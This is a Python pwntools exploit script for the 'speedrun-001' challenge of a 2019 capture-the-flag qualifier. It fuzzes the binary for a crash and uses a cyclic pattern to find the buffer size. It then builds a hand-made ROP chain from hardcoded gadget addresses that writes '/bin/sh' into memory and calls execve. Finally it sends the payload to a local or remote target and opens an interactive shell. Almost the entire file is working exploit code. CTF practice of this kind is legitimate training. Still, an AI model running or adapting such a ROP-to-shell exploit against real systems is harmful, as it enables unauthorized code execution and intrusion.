#!/usr/bin/env python2

from __future__ import print_function
import subprocess
from argparse import ArgumentParser
from pwn import *



# ==========================================================
#                       ARGUMENTS
# ==========================================================

parser = ArgumentParser()
parser.add_argument(
    "-f",
    "--file",
    dest="file",
    help="local file to use",
)
parser.add_argument(
    "-r",
    "--remote",
    dest="remote",
    help="remote destination"
)
parser.add_argument(
    "-n"
    "-nd",
    "--np-debug",
    dest="nodebug",
    action='store_true',
    help="deactivate debug",
)

args = parser.parse_args()
log.info(
    " ARGS"+
    " || File:" + 
    str(args.file) + 
    " || Remote:" + 
    str(args.remote) +
    " || No Debug:" + 
    str(args.nodebug)
)

if not args.file and not args.remote:
    log.warn("[!] NO FILE OR REMOTE LOC PROVIDED !!!!!!!!!!!!")
    log.warn('USAGE')
    log.warn('LOCAL            ./script.py -f ./speedrun-001')
    log.warn('LOCAL (nodebug)  ./script.py -f ./speedrun-001 -n')
    log.warn('REMOTE           ./script.py -r "speedrun-001.quals2019.oooverflow.io 31337"')
    exit(1)

# ==========================================================
# ----------------------------------------------------------
# ==========================================================




# ==========================================================
#                 CHANGEME : GLOBAL CONFIG
# ==========================================================

LOCAL_TARGET_PATH   = args.file if args.file and len(args.file) else None
REMOTE_TARGET_DEST  = args.remote if args.remote and len(args.remote) else None

# Alternatively use ./script.py NOPTRACE to skip gdb attach
NOPTRACE = args.nodebug
LOG_LEVEL = 'info' if args.nodebug else 'debug'

# Config for find crash function
INPUT_INCREMENT_FACTOR = 8

# Use new-window or split-window for tmux
PWNTOOLS_TERMINAL = ['tmux', 'new-window']

# Addres of the crash obtained while using cyclic pattern
# Will be used at get_buffer_size() if provided
# Example: 
PATTERN_FAIL_ADDRESS = 0x6942356942346942
# PATTERN_FAIL_ADDRESS = None

if LOCAL_TARGET_PATH:
    context(
        log_level = LOG_LEVEL,
        binary = LOCAL_TARGET_PATH,
        terminal = PWNTOOLS_TERMINAL,
        noptrace = NOPTRACE
    )
else:
    context(
        log_level = LOG_LEVEL,
        noptrace = True
    )


# ==========================================================
# ----------------------------------------------------------
# ==========================================================



# ==========================================================
#                          UTILS
# ==========================================================

def print_line():
    log.info("="*80)

def flatten(a_list):
    return ''.join(a_list)

# ==========================================================
# ----------------------------------------------------------
# ==========================================================



# ==========================================================
#                  CHANGEME : INTERACTIONS
# ==========================================================

# This function will change depending of the binary interactions needed
def interact_with(target):
    target.recvuntil("Any last words?\n")

# ==========================================================
# ----------------------------------------------------------
# ==========================================================




def find_crash(local_target_path):
    print_line()
    log.info("Getting a crash...")
    print_line()

    crashed = False
    payload = "D"
    while not crashed:
        print_line()

        target = process(local_target_path, shell=True)

        # defines interactions prev to the pwn 
        # this depends on the challenge!
        interact_with(target)
        
        payload = payload * INPUT_INCREMENT_FACTOR

        target.sendline(payload)
        recv = target.recvall()

        # If a crash didn'y happen just close the process
        target.close()
        endSignal = target.poll()
        log.debug("Process ended with signal " + str(endSignal))
        if endSignal == 0:
            log.debug("Process didn't crashed with input size = " + str(len(payload)))
        else:
            crashed = True
            log.success("[!] Process CRASHED with input size = " + str(len(payload)))
            log.success(recv)

    log.info("[!] Found crash for input size = " + str(len(payload)))
    return payload


def get_buffer_size(crashInputSize):
    print_line()
    log.info("Getting buffer size...")
    print_line()

    bufferSize = None

    subprocess.call(["rm", "./core"])
    pattern = cyclic_metasploit(crashInputSize)
    subprocess.call(["touch", "cyclic.pattern"])
    with open("cyclic.pattern", "w") as f:
        f.write(pattern)
        f.close()

    log.info(process(LOCAL_TARGET_PATH + " < cyclic.pattern", shell=True).recvall())

    subprocess.call(["rm", "vgcore.*"])
    valgrind = process("valgrind " + LOCAL_TARGET_PATH + " < cyclic.pattern", shell=True)
    log.info(valgrind.recvline_contains("Bad permissions for mapped"))
    print_line()

    if PATTERN_FAIL_ADDRESS:
        bufferSize = cyclic_metasploit_find(PATTERN_FAIL_ADDRESS)
        log.info("Buffer size : " + str(bufferSize))
    else:
        log.warn("[!] NO PATTERN_FAIL_ADDRESS VAR SET. CANT CALC BUFFER SIZE")
        log.warn("[!] LOOK FOR CRASH INFO IN VALGRIND OUTPUT TO FIND OUT THE ROOT CAUSE")
    return bufferSize


def build_rop_chain(bufferSize=0, manual=False, dump2File=True):
    print_line()
    log.info("Building ROP chain...")
    print_line()

    log.debug("[>] ================================= [<]")
    log.debug("[>] Don't forget the proper order!!!! [<]")
    log.debug("[>] 1. Angrop                         [<]")
    log.debug("[>] 2. Manual SROP                    [<]")
    log.debug("[>] 3. Manual ROP                     [<]")
    log.debug("[>] ================================= [<]")

    payload = "D" * bufferSize if bufferSize > 0 else ""
    log.info("Filled payload with " + str(bufferSize) + " lenght filler")

    if not manual:
        log.info("[!] Calling angrop automatic rop chain script")

    else:
        log.info("[!] Trying manual implementation")

        # Filter rop gadgets in radare2 by executable sections only!!!
        # iS= ~r-x

        def set_rsi(val):
            # 0x0048ac6b                 5e  pop rsi
            # 0x0048ac6c                 c3  ret
            return flatten([
                p64(0x48ac6b),
                p64(val),
            ])

        def set_rax(val):
            # 0x00475821                 58  pop rax
            # 0x00475822                 c3  ret 
            return flatten([
                p64(0x475821),
                p64(val),        
            ])

        def set_rdx(val):
            # 0x004498b5                 5a  pop rdx
            # 0x004498b6               f3c3  ret  
            return flatten([
                p64(0x4498b5),
                p64(val)       
            ])

        def syscall():
            # 0x00485375      0f05           syscall
            return flatten([
                p64(0x485375)
            ])

        def write_(what, where):
            # 0x00484ec0             488910  mov qword [rax], rdx
            # 0x00484ec3                 5b  pop rbx
            # 0x00484ec4                 c3  ret
            return flatten([
                set_rdx(what),
                set_rax(where),
                p64(0x484ec0),
                p64(0) # junk value for rbx
            ])

        def set_rdi(val):
            # 0x004916ef                 5f  pop rdi
            # 0x004916f0                 c3  ret
            return flatten([
                p64(0x4916ef),
                p64(val)
            ])

        # Execve
        #   rax=59
        #   rsi=NULL
        #   rdx=NULL
        #   rdi=ptr to "/bin/sh\n"

        ropChain = []
        # writable address from section .data found by : iS~w
        # 0x006b90e0
        dataAddrs = 0x6b90e0
        # echo -ne "/bin/sh\x00" | rev | xxd
        # 0x0068732f6e69622f
        binShString = 0x0068732f6e69622f
        ropChain.append(write_(binShString, dataAddrs))
        ropChain.append(set_rdi(dataAddrs))
        ropChain.append(set_rax(59))
        ropChain.append(set_rsi(0))
        ropChain.append(set_rdx(0))
        ropChain.append(syscall())

        payload += flatten(ropChain)

    log.info("Payload :")
    log.info(hexdump(payload))
    log.info("Total Payload lenght = " + str(len(payload)) + " | Buffer lenght = " + str(bufferSize))

    if dump2File:
        subprocess.call(["rm", "./payload"])
        subprocess.call(["touch", "payload"])
        with open("payload", "w") as f:
            f.write(payload)
            f.close()

    return payload




# ==========================================================
#                  CHANGEME : LOCAL DEBUG
# ==========================================================

if LOCAL_TARGET_PATH:
    log.info("LOCAL DEBUG: " + LOCAL_TARGET_PATH)

    crashPayload = find_crash(LOCAL_TARGET_PATH)
    bufferSize = get_buffer_size(len(crashPayload))
    build_rop_chain(bufferSize=bufferSize, manual=False)
    payload = build_rop_chain(bufferSize=bufferSize, manual=True, dump2File=True)

    target = process(LOCAL_TARGET_PATH)
    interact_with(target)

    gdb.attach(target, ''' break *0x48ac6b ''')
    # # ONCE inside GDB debug rop chain using:
    # # - GDB ni, stepi, x/x, etc
    # # - GEF's unicorn emulation "emu -n 1 -o ./unicorn-emu.py"

    sleep(1)
    target.send(payload)
    target.interactive()


# ==========================================================
#                  CHANGEME : REMOTE EXPLOIT
# ==========================================================

if REMOTE_TARGET_DEST:
    log.info("REMOTE EXPLOIT: " + REMOTE_TARGET_DEST)
    remoteDest = REMOTE_TARGET_DEST.split(" ")
    addr = remoteDest[0]
    port = remoteDest[1]
    log.info("REMOTE ADDR: " + addr)
    log.info("REMOTE PORT: " + port)

    payload = build_rop_chain(bufferSize=1032, manual=True, dump2File=False)

    target = remote(addr, port)
    interact_with(target)

    sleep(1)
    target.send(payload)
    target.interactive()
